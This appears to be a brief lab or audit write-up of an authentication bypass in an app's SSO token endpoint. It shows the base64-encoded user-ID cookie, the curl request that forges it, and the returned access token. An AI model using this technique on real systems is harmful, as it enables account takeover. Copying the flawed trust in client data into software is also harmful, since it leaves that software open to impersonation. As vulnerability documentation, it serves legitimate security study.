# SSO Cookie Authentication Bypass

## Overview

An *authentication bypass* vulnerability exists in `GetTokenSSO` method in `AuthorizationsController` class due to incorrect trust on user supplied data.

## Exploitation

The vulnerable endpoint is accessible through the following URL:

```
http://rws.local:5000/api/authorizations/GetTokenSSO
```

It is possible to exploit this endpoint to generate access token for arbitrary user by specially crafting the value of `sso_ctx` cookie.

We craft the cookie value as below:

```
$ echo '{ "auth_user": "8" }' | base64
eyAiYXV0aF91c2VyIjogIjgiIH0K
```

On sending this specially crafted value, we get the access token for user with `ID` 8:

```
$ curl -H 'Cookie: sso_ctx=eyAiYXV0aF91c2VyIjogIjgiIH0K' http://rws.local:5000/api/authorizations/GetTokenSSO

{"role":"User","accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGVzdEB0ZXN0LmNvbSIsInJvbGUiOiJVc2VyIiwiZXhwIjoxNTI2NDkxNTMxLCJpc3MiOiJodHRwOi8vbG9jYWxob3N0LmxvY2FsLyIsImF1ZCI6Imh0dHA6Ly9sb2NhbGhvc3QubG9jYWwvIn0.EJh2ZN_gJvPjl3KrSqqsaahfDzq9kiTMQ88K1ViGIpA"}
```

> This results in authentication bypass as we can generate an `accessToken` for any user without supplying valid credentials.